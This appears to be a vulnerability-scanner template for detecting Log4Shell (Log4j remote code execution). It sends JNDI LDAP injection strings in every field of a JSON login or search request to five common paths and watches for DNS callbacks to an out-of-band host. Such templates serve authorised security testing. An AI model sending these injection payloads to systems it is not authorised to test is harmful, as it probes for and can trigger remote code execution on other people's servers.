http:
- body: "{\n  \"username\": \"${jndi:ldap://{{interactsh-url}}/post_user}\",\n  \"\
    password\": \"${jndi:ldap://{{interactsh-url}}/post_pass}\",\n  \"email\": \"\
    ${jndi:ldap://{{interactsh-url}}/post_email}\",\n  \"query\": \"${jndi:ldap://{{interactsh-url}}/post_query}\"\
    ,\n  \"message\": \"${jndi:ldap://{{interactsh-url}}/post_msg}\"\n}\n"
  headers:
    Content-Type: application/json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: POST
  path:
  - '{{BaseURL}}/api/login'
  - '{{BaseURL}}/login'
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/api/users'
  - '{{BaseURL}}/contact'
  stop-at-first-match: true
id: log4j-json
info:
  author: reewardius
  name: Log4j Remote Code Execution - Complete Detection
  severity: critical
  tags: log4j,rce
